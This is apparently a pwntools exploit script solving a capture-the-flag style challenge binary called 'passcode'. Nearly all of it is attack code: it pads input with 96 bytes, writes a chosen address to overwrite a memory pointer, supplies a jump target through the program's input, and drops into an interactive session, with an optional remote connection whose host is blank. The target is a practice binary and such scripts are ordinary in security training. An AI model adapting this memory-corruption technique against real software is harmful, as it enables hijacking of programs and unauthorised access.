#!/usr/bin/python3

from pwn import *

exe = ELF('passcode', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*0x08049358

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('')
else:
        p = process(exe.path)

GDB()
payload = b"A" * 96
sla(b"beta.\n", payload + p32(0x804c010))
sl(str(0x0804926e))
p.interactive()

